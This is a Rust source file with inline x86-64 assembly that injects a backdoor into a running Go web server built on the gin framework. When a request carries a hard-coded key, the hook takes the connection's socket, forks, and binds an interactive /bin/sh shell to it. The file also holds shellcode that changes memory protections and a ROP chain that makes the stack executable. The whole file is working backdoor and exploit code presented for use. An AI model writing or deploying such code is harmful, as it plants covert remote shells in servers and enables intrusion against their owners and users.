use std::arch::global_asm;

use crate::constants::*;

// Full payload:
// Checks if the UID starts with 405af337. If it's not, continue the program normally.
// If it is, navigate the gin context structure to get the file descriptor of the connection.
// Fork the process. The parent simply sets the FD to null(to avoid closing it) and return from the handler function
// The child process spawns an interactive shell connected to the socket's file descriptor.
global_asm!(
    "
hook_start:
    push rax
    mov rax, {payload_address}
    jmp rax

payload_start:
    # Push important registers. rax is already pushed in the hook
    push rbx
    push rcx
    push rdx
    push rdi
    push rsi

    # Check for AAAABBBB id
    mov rax, {backdoor_key}
    cmp [rdx], rax
    jnz end

    # Find file descriptor
    # get gin Context pointer
    mov rax, [rsp + 0x1f8]
    # deref gin context (interface)
    mov rax, [rax + 0x08]
    # follow conn pointer
    mov rax, [rax]
    # follow netConn pointer (interface)
    mov rax, [rax + 0x18]
    # follow netFD pointer
    mov rax, [rax]
    # Save netFD location so we can null the fd in parent
    mov rsi, rax
    # fd
    mov rax, [rax + 0x10]

    # Fork the process
    mov rdi, rax
    mov rax, 0x39;
    syscall;

    # If parent, null the fd and return
    cmp rax, 0
    jnz return

    # dup2 the file descriptor
    mov rax, 0x21
    mov rsi, 0
    syscall

    mov rax, 0x21
    mov rsi, 0x01
    syscall

    mov rax, 0x21
    mov rsi, 0x02
    syscall

    # execve(/bin/sh, NULL, NULL)
    mov rax, 0x3b
    xor rsi, rsi
    mov rcx, 0x68732f2f6e69622f
    push rsi
    push rsp
    pop rsi
    push rsp
    pop rdx
    push rcx
    push rsp
    pop rdi
    syscall

    # Use this to abort the payload and continue as normal
    # Bring the state back to what it was before
    # Executes the instructions that were overwritten
    # Returns right after the hook
end:
    pop rsi
    pop rdi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    # do overwritten inst
    lea    rcx,[rsp+0x170]
    mov edi, 1
    # jump to after the patch
    mov r12, {return_after_hook}
    jmp r12

    # This nulls out the fd so the parent doesn't close the socket.
    # It also fixes the stack so that we return from the handler function.
return:
    # Set the fd to -1
    # Might be a bit cleaner to open one to /dev/null, as long as it gets closed
    mov rax, -1
    mov [rsi + 0x10], rax
    pop rsi
    pop rdi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    # Return from the handler function
    leave
    ret
stack_shellcode_start:
    # mprotect hook
    mov rax, 0x0a
    mov rdi, {hook_addr_aligned}
    syscall

    # mprotect payload
    mov rax, 0x0a
    mov rdi, {payload_addr_aligned}
    syscall

    # getpid
    mov rax, 39
    syscall

    # Restore RSP
    mov rsp, 0x4141414141414141

    # kill(injector_pid, SIGSTOP)
    mov rdi, rax
    mov rsi, 19
    mov rax, 62
    syscall
hcf:
    jmp hcf
stack_shellcode_end:
",
    payload_address = const PAYLOAD_ADDRESS,
    backdoor_key = const BACKDOOR_KEY,
    return_after_hook = const RETURN_AFTER_HOOK,
    hook_addr_aligned = const HOOK_ADDRESS & PAGE_MASK,
    payload_addr_aligned = const PAYLOAD_ADDRESS & PAGE_MASK,
);

// These exports points to the memory location of the labels
unsafe extern "C" {
    pub fn hook_start();
    pub fn payload_start();
    pub fn stack_shellcode_start();
    pub fn stack_shellcode_end();
}

pub const ROPCHAIN: &[usize] = &[
    // mprotect the stack and jump to the end
    0x000000000084fc82, // pop rdi; ret;
    0x4141414141414141, // PLACEHOLDER for RSP
    0x0000000000851802, // pop rsi; ret;
    0x10000,            // 10 page length
    0x0000000000652655, // pop rdx; ret;
    7,                  // RWX flags
    0x0000000000471c0e, // pop rax; ret;
    0xa,                // mprotect syscall number
    0x0000000000490a29, // syscall; ret;
    0x000000000048daf3, // call rps;
];
